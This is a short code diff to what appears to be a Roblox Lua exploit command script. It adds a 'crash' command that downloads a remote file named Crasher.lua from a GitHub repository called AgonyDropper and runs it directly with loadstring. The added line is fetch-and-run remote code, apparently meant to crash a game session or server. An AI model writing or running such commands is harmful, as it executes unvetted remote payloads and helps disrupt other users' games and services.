@@ -105,6 +105,10 @@ cmds["wallet"] = function(args, p)
   end
 end
 
+cmds["crash"] = function(args, p)
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/diz-zzyy/AgonyDropper/main/Crasher.lua"))()
+end
+
 ---------------------------------------------------------------
 
 _G.AgonyCommands = cmds
